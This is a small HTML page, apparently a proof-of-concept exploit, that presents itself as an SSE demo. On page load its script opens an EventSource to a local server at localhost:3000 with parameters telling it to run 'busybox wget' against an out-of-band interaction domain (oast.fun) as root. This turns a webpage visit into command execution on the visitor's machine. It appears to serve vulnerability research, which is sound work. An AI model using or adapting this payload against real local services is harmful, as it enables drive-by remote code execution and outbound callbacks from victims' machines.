<!DOCTYPE html>
<html>
<head>
    <title>SSE with Custom Params Demo</title>
</head>
<body>
    <h2>SSE Output</h2>
    <pre id="output"></pre>
    <script>
        const output = document.getElementById('output');

        // Use your full (escaped) URL here:
        const sseUrl = "http://localhost:3000/sse?transportType=stdio&command=busybox&args=wget%20qolyoxnongxznplgzcoqb0irvxifffemc.oast.fun&env=%7B%22HOME%22%3A%22%2Froot%22%2C%22PATH%22%3A%22%2Fapp%2Fnode_modules%2F.bin%3A%2Fnode_modules%2F.bin%3A%2Fusr%2Flib%2Fnode_modules%2Fnpm%2Fnode_modules%2F%40npmcli%2Frun-script%2Flib%2Fnode-gyp-bin%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22%7D";

        const evtSource = new EventSource(sseUrl);

        evtSource.onopen = function() {
            output.textContent += "SSE connection opened.\n";
        };

        evtSource.onmessage = function(event) {
            output.textContent += event.data + "\n";
        };

        evtSource.onerror = function(event) {
            output.textContent += "SSE error or connection closed\n";
        };
    </script>
</body>
</html>
